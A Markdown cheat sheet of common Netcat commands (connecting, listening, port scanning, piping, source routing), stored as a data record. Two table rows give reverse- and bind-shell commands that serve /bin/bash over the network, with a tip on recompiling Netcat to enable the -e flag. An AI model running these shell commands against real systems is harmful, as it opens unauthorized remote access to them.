  md: '# USEFUL NETCAT COMMANDS


    Netcat is a command-line tool that reads and writes data across networks using
    the TCP and UDP protocols. It is known as the “network Swiss army knife” because
    of the many different functions it can perform. The following table provides a
    quick usage guide for the most useful Netcat commands.


    ⓘ Netcat uses the TCP protocol by default. The -u flag can be used with many of
    the commands in the following table in order to make Netcat use UDP instead.


    | Description | Command |

    | --- | --- |

    | Connect to a port on a remote host | nc remote_host <port> |

    | Connect to multiple ports on a remote host | nc remote_host <port>..<port>  For
    example:  nc www.somecompanyasanexample.com 21 25 80 |

    | Listen on a port for incoming connections | nc -v -l -p <port> |

    | Connect to remote host and serve a bash shell | nc remote_ip <port> -e /bin/bash  Note
    that Netcat does not support the -e flag by default. To make Netcat support the
    -e flag, it must be re-compiled with the DGAPING_SECURITY_HOLE option. |

    | Listen on a port and serve a bash shell upon connect | nc -v -l -p <port> -e
    /bin/bash  Note that Netcat does not support the -e flag by default. To make Netcat
    support the -e flag, it must be re-compiled with the DGAPING_SECURITY_HOLE option.
    |

    | Port scan a remote host | nc -v -z remote_host <port>--<port>  Use the -i flag
    to set a delay interval:  nc -i <seconds> -v -z remote_host <port>--<port> |

    | Pipe command output to a netcat request | <command> \| nc remote_host <port>  For
    example:  echo "GET / HTTP/1.0 [enter] [enter] \*" \| nc www.somecompanyasanexample.com
    80 |

    | Use source-routing to connect to a port on a remote host | nc -g <gateway> remote_host
    <port>  Note: Up to eight hop points may be specified using the -g flag. Use the
    -G flag to specify the source-routing pointer. |'
  merge: -1
  img_proc: true
